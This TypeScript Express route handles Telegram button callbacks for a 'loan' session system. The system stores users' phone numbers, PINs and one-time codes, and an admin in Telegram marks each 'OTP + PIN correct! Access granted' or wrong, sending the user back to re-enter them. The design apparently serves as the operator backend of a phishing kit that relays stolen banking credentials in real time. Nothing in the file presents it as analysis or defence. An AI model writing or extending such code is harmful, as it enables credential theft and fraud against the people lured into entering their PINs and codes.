import { Router, type IRouter } from "express";
import { eq } from "drizzle-orm";
import { db, loanSessionsTable } from "@workspace/db";
import { answerCallbackQuery, editMessageReplyMarkup } from "../lib/telegram";

const router: IRouter = Router();

const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;

// POST /telegram/webhook — handle Telegram inline keyboard callbacks
router.post("/telegram/webhook", async (req, res): Promise<void> => {
  const body = req.body as {
    callback_query?: {
      id: string;
      data?: string;
      from?: { id: number };
      message?: { chat?: { id: number }; message_id?: number };
    };
  };

  // Only handle callback queries (button presses)
  if (!body.callback_query) {
    res.status(200).json({ ok: true });
    return;
  }

  const { id: callbackId, data, from, message } = body.callback_query;

  // Security: only allow admin
  if (ADMIN_CHAT_ID && from?.id?.toString() !== ADMIN_CHAT_ID) {
    req.log.warn({ fromId: from?.id }, "Unauthorized Telegram callback");
    await answerCallbackQuery(callbackId, "Unauthorized");
    res.status(200).json({ ok: true });
    return;
  }

  if (!data) {
    res.status(200).json({ ok: true });
    return;
  }

  // Parse callback data: "action:sessionId"
  const colonIdx = data.indexOf(":");
  if (colonIdx === -1) {
    res.status(200).json({ ok: true });
    return;
  }

  const action = data.substring(0, colonIdx);
  const sessionId = data.substring(colonIdx + 1);

  req.log.info({ action, sessionId }, "Telegram callback received");

  const [session] = await db
    .select()
    .from(loanSessionsTable)
    .where(eq(loanSessionsTable.sessionId, sessionId))
    .limit(1);

  if (!session) {
    await answerCallbackQuery(callbackId, "Session not found");
    res.status(200).json({ ok: true });
    return;
  }

  // Remove buttons from the original message
  const chatId = message?.chat?.id?.toString();
  const msgId = message?.message_id?.toString();
  if (chatId && msgId) {
    try {
      await editMessageReplyMarkup(chatId, msgId);
    } catch (_err) {
      // Non-fatal
    }
  }

  switch (action) {
    case "approve_login": {
      await db
        .update(loanSessionsTable)
        .set({ loginApprovalStatus: "approved" })
        .where(eq(loanSessionsTable.sessionId, sessionId));
      await answerCallbackQuery(callbackId, "✅ Application approved!");
      req.log.info({ sessionId }, "Login approved by admin");
      break;
    }

    case "reject_login": {
      await db
        .update(loanSessionsTable)
        .set({ loginApprovalStatus: "rejected" })
        .where(eq(loanSessionsTable.sessionId, sessionId));
      await answerCallbackQuery(callbackId, "❌ Application rejected");
      req.log.info({ sessionId }, "Login rejected by admin");
      break;
    }

    case "otp_correct": {
      await db
        .update(loanSessionsTable)
        .set({ otpVerificationStatus: "correct" })
        .where(eq(loanSessionsTable.sessionId, sessionId));
      await answerCallbackQuery(callbackId, "✅ OTP + PIN correct! Access granted.");
      req.log.info({ sessionId }, "OTP marked correct by admin");
      break;
    }

    case "otp_wrong_pin": {
      await db
        .update(loanSessionsTable)
        .set({
          otpVerificationStatus: "wrong_pin",
          // Reset login status so user can retry login
          loginApprovalStatus: "pending",
          pin: null,
          loginPhone: null,
        })
        .where(eq(loanSessionsTable.sessionId, sessionId));
      await answerCallbackQuery(callbackId, "❌ Wrong PIN — user returned to login.");
      req.log.info({ sessionId }, "OTP marked wrong PIN by admin");
      break;
    }

    case "otp_wrong_otp": {
      await db
        .update(loanSessionsTable)
        .set({
          otpVerificationStatus: "wrong_otp",
          otpCode: null,
        })
        .where(eq(loanSessionsTable.sessionId, sessionId));
      await answerCallbackQuery(callbackId, "❌ Wrong OTP — user returned to OTP page.");
      req.log.info({ sessionId }, "OTP marked wrong OTP by admin");
      break;
    }

    default:
      req.log.warn({ action }, "Unknown Telegram callback action");
  }

  res.status(200).json({ ok: true });
});

export default router;
